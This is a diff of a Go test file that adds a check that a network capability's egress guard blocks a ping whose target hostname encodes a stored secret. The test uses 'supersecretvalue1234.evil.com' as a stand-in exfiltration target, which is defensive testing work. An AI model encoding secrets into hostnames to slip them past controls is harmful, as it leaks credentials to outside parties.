@@ -3,13 +3,29 @@ package netcap_test
 import (
 	"context"
 	"encoding/json"
+	"errors"
 	"strings"
 	"testing"
 
 	"github.com/efuturetoday/nocturn/internal/capability"
 	"github.com/efuturetoday/nocturn/internal/gateway"
 	"github.com/efuturetoday/nocturn/internal/netcap"
+	"github.com/efuturetoday/nocturn/internal/secret"
 )
+
+// The egress gap is closed: a secret encoded into the ping target is blocked before
+// any ICMP leaves the process.
+func TestPing_EgressBlocksSecretInHost(t *testing.T) {
+	store := secret.NewStore()
+	store.Set("tok", []byte("supersecretvalue1234"))
+	n := &netcap.Net{
+		Guard:   &gateway.Guard{Policy: allowPing(capability.Wildcard)},
+		Scanner: secret.NewScanner(store),
+	}
+	if _, err := n.Ping(context.Background(), "supersecretvalue1234.evil.com"); !errors.Is(err, secret.ErrLeaked) {
+		t.Fatalf("err = %v, want ErrLeaked (secret in the ping target)", err)
+	}
+}
 
 // allowPing permits ping over the given target glob (a read).
 func allowPing(targetGlob string) capability.Policy {
